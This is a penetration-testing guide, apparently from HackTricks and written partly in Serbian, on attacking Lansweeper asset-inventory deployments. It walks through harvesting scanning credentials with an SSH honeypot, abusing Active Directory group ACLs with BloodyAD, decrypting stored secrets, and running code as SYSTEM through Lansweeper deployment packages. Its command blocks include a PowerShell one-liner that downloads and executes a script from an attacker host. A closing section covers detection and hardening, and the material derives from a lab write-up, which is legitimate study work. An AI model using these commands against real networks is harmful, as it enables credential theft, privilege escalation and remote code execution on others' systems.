# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper je platforma za otkrivanje i inventar IT imovine često postavljena na Windows i integrisana sa Active Directory. Kredencijali konfigurisani u Lansweeper-u koriste se od strane njegovih scanning engines da se autentifikuju na asset-e preko protokola kao što su SSH, SMB/WMI i WinRM. Pogrešne konfiguracije često dozvoljavaju:

- Presretanje kredencijala preusmeravanjem scanning target-a na host kojim kontroliše napadač (honeypot)
- Zloupotrebu AD ACLs izloženih od strane Lansweeper-related groups da bi se stekao udaljeni pristup
- Dešifrovanje Lansweeper-konfigurisанih tajni na hostu (connection strings i sačuvani scanning credentials)
- Izvršavanje koda na managed endpoints preko Deployment feature-a (često pokreće kao SYSTEM)

Ova stranica sumira praktične toka napadača i komande za zloupotrebu ovih ponašanja tokom engagement-a.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: kreirajte Scanning Target koji pokazuje na vaš host i mapirajte postojeće Scanning Credentials na njega. Kada scan pokrene, Lansweeper će pokušati da se autentifikuje tim kredencijalima, i vaš honeypot će ih uhvatiti.

Pregled koraka (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Proverite uhvaćene creds na DC servisima:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Works similarly for other protocols when you can coerce the scanner to your listener (SMB/WinRM honeypots, etc.). SSH is often the simplest.
- Many scanners identify themselves with distinct client banners (e.g., RebexSSH) and will attempt benign commands (uname, whoami, etc.).

## 2) AD ACL abuse: osvojite udaljeni pristup dodavanjem sebe u app-admin grupu

Koristite BloodHound za enumeraciju efektivnih prava kompromitovanog naloga. Čest nalaz je grupa specifična za scanner ili aplikaciju (npr. “Lansweeper Discovery”) koja ima GenericAll nad privilegovanom grupom (npr. “Lansweeper Admins”). Ako je privilegovana grupa takođe član “Remote Management Users”, WinRM postaje dostupan čim sebe dodamo.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Eksploatacija GenericAll na grupi pomoću BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Zatim dobijte interaktivni shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Tip: Kerberos operacije su vremenski osetljive. Ako dobijete KRB_AP_ERR_SKEW, prvo sinhronizujte vreme sa DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Dekriptirajte tajne koje je Lansweeper konfigurisao na hostu

Na Lansweeper serveru, ASP.NET sajt obično čuva šifrovani connection string i simetrični ključ koji aplikacija koristi. Uz odgovarajući lokalni pristup možete dešifrovati DB connection string i potom izvući sačuvane kredencijale za skeniranje.

Tipične lokacije:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Koristite SharpLansweeperDecrypt za automatizaciju dešifrovanja i izvlačenja sačuvanih kredencijala:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Očekivani izlaz uključuje DB connection details i plaintext scanning credentials, kao što su Windows i Linux nalozi koji se koriste širom okruženja. Oni često imaju povišena lokalna prava na hostovima u domeni:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Iskoristi povraćene Windows scanning creds za privilegovan pristup:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Kao član “Lansweeper Admins”, web UI izlaže Deployment i Configuration. Pod Deployment → Deployment packages, možete kreirati pakete koji izvršavaju proizvoljne komande na ciljnim asset-ima. Izvršenje obavlja Lansweeper service sa visokim privilegijama, što rezultuje izvršavanjem koda kao NT AUTHORITY\SYSTEM na odabranom hostu.

High-level steps:
- Kreirajte novi Deployment package koji pokreće PowerShell ili cmd one-liner (reverse shell, add-user, itd.).
- Ciljajte željeni asset (npr. DC/host gde Lansweeper radi) i kliknite Deploy/Run now.
- Uhvatite svoj shell kao SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Use judiciously.

## Detekcija i hardening

- Ograničite ili uklonite anonimne SMB enumeracije. Monitorirajte za RID cycling i anomalne pristupe Lansweeper share-ovima.
- Kontrole izlaza: blokirajte ili strogo ograničite outbound SSH/SMB/WinRM sa scanner hostova. Upozorite na nestandardne portove (npr. 2022) i neuobičajene client bannere poput Rebex.
- Protect `Website\\web.config` and `Key\\Encryption.txt`. Externalizujte secrets u vault i rotirajte pri izlaganju. Razmotrite servisne naloge sa minimalnim privilegijama i gMSA gde je izvodljivo.
- AD monitoring: alarmirajte na promene u Lansweeper-related grupama (npr. “Lansweeper Admins”, “Remote Management Users”) i na ACL izmene koje dodeljuju GenericAll/Write članstvo privilegovanim grupama.
- Audit Deployment package creations/changes/executions; alarmirajte na pakete koji pokreću cmd.exe/powershell.exe ili neočekivane outbound konekcije.

## Povezane teme
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
